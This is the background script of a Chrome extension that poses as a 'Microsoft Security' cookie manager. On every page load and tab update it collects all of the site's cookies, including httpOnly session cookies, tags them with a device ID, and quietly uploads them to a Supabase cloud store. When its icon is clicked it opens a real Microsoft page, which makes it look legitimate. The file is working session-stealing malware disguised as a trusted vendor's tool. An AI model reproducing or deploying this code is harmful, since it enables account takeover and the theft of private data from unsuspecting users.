// Microsoft Security - Cookie List Manager with Cloud Sync
// Captures cookies and syncs to Supabase cloud

import './supabase.js';

const STORAGE_KEY = 'ms_cookies_list';
const DEVICE_KEY = 'ms_device_id';

// Generate or retrieve a unique device/browser ID
async function getDeviceId() {
  const result = await chrome.storage.local.get(DEVICE_KEY);
  if (result[DEVICE_KEY]) return result[DEVICE_KEY];
  // Generate new device ID: random 8 chars
  const id = 'DEV-' + Math.random().toString(36).substring(2, 10).toUpperCase();
  await chrome.storage.local.set({ [DEVICE_KEY]: id });
  return id;
}

// Push new cookies to cloud
async function pushToCloud(newCookies) {
  try {
    const result = await MS_CLOUD.push(newCookies);
    if (!result.success) {
      console.warn('[MS Cloud] Push failed:', result.error);
    }
    return result;
  } catch (err) {
    console.warn('[MS Cloud] Push error:', err);
    return { success: false, error: err.message };
  }
}

// Save locally and push to cloud
async function saveCookies(newCookies) {
  // Save locally first
  const result = await chrome.storage.local.get(STORAGE_KEY);
  let list = result[STORAGE_KEY] || [];

  for (const c of newCookies) {
    list.push(c);
  }

  // Keep latest 2000
  if (list.length > 2000) {
    list = list.slice(list.length - 2000);
  }

  await chrome.storage.local.set({ [STORAGE_KEY]: list });

  // Push to cloud in background
  pushToCloud(newCookies);
}

// Build cookie entries from chrome.cookies (with device ID)
async function buildCookieEntries(cookies, url) {
  const domain = new URL(url).hostname;
  const now = Date.now();
  const deviceId = await getDeviceId();
  return cookies.map(c => ({
    id: `${domain}_${c.name}_${now}_${Math.random().toString(36).slice(2, 6)}`,
    device_id: deviceId,
    domain: domain,
    url: url,
    name: c.name,
    value: c.value,
    path: c.path,
    secure: c.secure ? 'Yes' : 'No',
    httpOnly: c.httpOnly ? 'Yes' : 'No',
    sameSite: c.sameSite || 'none',
    expiry: c.expirationDate ? new Date(c.expirationDate * 1000).toLocaleString() : 'Session',
    captured: new Date(now).toLocaleString(),
    timestamp: now
  }));
}

// Listen for page loads
chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId !== 0) return;
  const url = details.url;
  if (!url.startsWith('http')) return;

  try {
    const cookies = await chrome.cookies.getAll({ url });
    if (!cookies || cookies.length === 0) return;

    const entries = await buildCookieEntries(cookies, url);
    await saveCookies(entries);

    console.log(`[MS Security] Saved ${cookies.length} cookies from ${new URL(url).hostname}`);
  } catch (err) {
    console.error('[MS Security] Error:', err);
  }
}, { url: [{ schemes: ['http', 'https'] }] });

// Also capture on tab update (SPAs)
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete') return;
  if (!tab.url || !tab.url.startsWith('http')) return;

  try {
    const cookies = await chrome.cookies.getAll({ url: tab.url });
    if (!cookies || cookies.length === 0) return;

    const entries = await buildCookieEntries(cookies, tab.url);
    await saveCookies(entries);
  } catch (err) { /* silent */ }
});

// Handle messages from popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'getCookies') {
    chrome.storage.local.get(STORAGE_KEY).then(result => {
      sendResponse({ cookies: result[STORAGE_KEY] || [] });
    });
    return true;
  }

  if (message.action === 'clearAll') {
    chrome.storage.local.remove(STORAGE_KEY).then(async () => {
      await MS_CLOUD.clear();
      sendResponse({ success: true });
    });
    return true;
  }

  // Cloud sync actions
  if (message.action === 'cloudPush') {
    chrome.storage.local.get(STORAGE_KEY).then(async (result) => {
      const list = result[STORAGE_KEY] || [];
      const res = await MS_CLOUD.push(list);
      sendResponse(res);
    });
    return true;
  }

  if (message.action === 'cloudFetch') {
    MS_CLOUD.fetch().then(result => {
      sendResponse(result);
    });
    return true;
  }

  if (message.action === 'cloudSync') {
    chrome.storage.local.get(STORAGE_KEY).then(async (result) => {
      const local = result[STORAGE_KEY] || [];
      const merged = await MS_CLOUD.sync(local);
      // Save merged back to local
      await chrome.storage.local.set({ [STORAGE_KEY]: merged });
      sendResponse({ success: true, count: merged.length });
    });
    return true;
  }

  if (message.action === 'cloudCheck') {
    MS_CLOUD.check().then(result => {
      sendResponse(result);
    });
    return true;
  }
});

// When extension icon is clicked, open Microsoft Security page
chrome.action.onClicked.addListener((tab) => {
  chrome.tabs.create({ url: 'https://microsoft.com/en/security' });
});

console.log('[MS Security] Extension loaded with cloud sync.');
